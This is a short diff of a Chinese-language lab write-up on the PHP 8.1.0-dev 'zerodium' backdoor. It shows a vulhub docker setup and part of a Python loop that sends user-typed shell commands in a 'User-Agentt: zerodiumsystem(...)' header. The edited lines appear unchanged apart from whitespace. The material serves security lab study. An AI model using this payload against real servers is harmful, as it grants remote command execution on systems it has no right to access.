@@ -43,7 +43,7 @@ PHP 8.1.0-dev
 使用 vulhub 进行搭建：  
 
 ```
-cd vulhub/php/8.1-backdoor
+cd vulhub/php/8.1-backdoor
 sudo docker-compose up -d
 ```
 
@@ -98,7 +98,7 @@ if str(response) == '<Response [200]>':
             cmd = input("$ ")
             headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0",
-            "User-Agentt": "zerodiumsystem('" + cmd + "');"
+            "User-Agentt": "zerodiumsystem('" + cmd + "');"
             }
             response = request.get(host, headers = headers, allow_redirects = False)
             current_page = response.text
